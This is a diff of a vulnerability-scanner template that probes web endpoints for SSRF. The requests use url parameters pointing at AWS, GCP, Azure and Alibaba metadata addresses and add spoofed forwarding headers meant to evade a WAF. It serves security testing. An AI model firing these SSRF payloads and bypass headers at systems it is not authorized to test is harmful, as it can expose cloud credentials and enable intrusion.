@@ -1,22 +1,37 @@
-id: K70n0s510-cloud-metadata-ssrf
+id: K70n0s510-polyglot-metadata
 info:
-  name: Cloud Metadata Exposure (SSRF/A01)
+  name: Cloud Metadata SSRF (Polyglot & Bypass)
   author: K70n0s510
   severity: critical
-  description: Detects endpoints that leak Cloud Metadata (AWS/GCP/Azure) indicating a Broken Access Control (SSRF) flaw.
+  description: Checks AWS, GCP, Azure, and Alibaba metadata with bypass headers.
 http:
   - method: GET
     path:
+      # Standard Metadata IPs
       - "{{BaseURL}}/?url=http://169.254.169.254/latest/meta-data/"
-      - "{{BaseURL}}/proxy?target=http://169.254.169.254/latest/meta-data/"
-      - "{{BaseURL}}/fetch?uri=http://metadata.google.internal/computeMetadata/v1/"
-      - "{{BaseURL}}/feed?url=http://169.254.169.254/"
+      - "{{BaseURL}}/?url=http://metadata.google.internal/computeMetadata/v1/project/project-id"
+      - "{{BaseURL}}/?url=http://100.100.100.200/latest/meta-data/"
+    
+    # Header Bypasses (Spoofing IP to bypass WAF)
+    headers:
+      X-Forwarded-For: 127.0.0.1
+      X-Real-IP: 127.0.0.1
+      Metadata-Flavor: Google
 
     matchers-condition: or
     matchers:
       - type: word
+        name: aws-hit
         words:
           - "ami-id"
           - "instance-id"
+      - type: word
+        name: gcp-hit
+        words:
           - "computeMetadata"
-          - "iam/security-credentials/"
+          - "google"
+      - type: word
+        name: alibaba-hit
+        words:
+          - "image-id"
+          - "vpc-id"
